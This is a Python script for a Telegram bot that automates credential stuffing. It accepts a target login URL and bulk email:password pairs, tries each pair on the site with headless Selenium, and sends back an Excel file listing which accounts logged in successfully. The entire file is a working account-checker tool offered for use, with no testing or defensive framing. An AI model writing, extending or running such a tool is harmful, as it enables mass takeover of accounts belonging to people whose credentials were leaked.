import telebot
import pandas as pd
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
import time
import os

# Replace with your Telegram Bot Token
BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN"

bot = telebot.TeleBot(BOT_TOKEN)

# Global variables
target_url = None
logins = []

# Command to set target URL
@bot.message_handler(commands=['seturl'])
def set_url(message):
    global target_url
    url = message.text.split(" ", 1)
    if len(url) > 1:
        target_url = url[1].strip()
        bot.reply_to(message, f"✅ Target URL set to: {target_url}")
    else:
        bot.reply_to(message, "❌ Please provide a URL.\nExample: /seturl https://example.com/login")

# Command to add login credentials
@bot.message_handler(commands=['addlogin'])
def add_login(message):
    bot.reply_to(message, "📥 Send me login credentials in the format:\nemail:password\nOne per line.")
    bot.register_next_step_handler(message, process_logins)

def process_logins(message):
    global logins
    creds = message.text.strip().split("\n")
    for cred in creds:
        if ":" in cred:
            logins.append(cred.strip())
    bot.reply_to(message, f"✅ Added {len(creds)} login(s).")

# Command to check logins
@bot.message_handler(commands=['check'])
def check_logins(message):
    if not target_url:
        bot.reply_to(message, "❌ Please set the target URL first using /seturl")
        return
    if not logins:
        bot.reply_to(message, "❌ Please add login credentials first using /addlogin")
        return

    bot.reply_to(message, "🔍 Starting login check... Please wait.")
    results = []
    
    chrome_options = Options()
    chrome_options.add_argument("--headless")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")

    for cred in logins:
        email, password = cred.split(":", 1)
        driver = webdriver.Chrome(options=chrome_options)
        driver.get(target_url)
        time.sleep(2)

        try:
            # Example login fields (change according to target site)
            driver.find_element(By.NAME, "email").send_keys(email)
            driver.find_element(By.NAME, "password").send_keys(password)
            driver.find_element(By.TAG_NAME, "button").click()
            time.sleep(3)

            if "dashboard" in driver.current_url.lower():
                results.append({"Email": email, "Password": password, "Status": "✅ Success"})
            else:
                results.append({"Email": email, "Password": password, "Status": "❌ Failed"})
        except Exception as e:
            results.append({"Email": email, "Password": password, "Status": f"⚠ Error: {str(e)[:30]}"})
        driver.quit()

    # Save results to Excel
    df = pd.DataFrame(results)
    file_path = "login_results.xlsx"
    df.to_excel(file_path, index=False)

    # Send file to user
    with open(file_path, "rb") as f:
        bot.send_document(message.chat.id, f)

    os.remove(file_path)
    bot.reply_to(message, "✅ Login check completed.")

bot.polling()
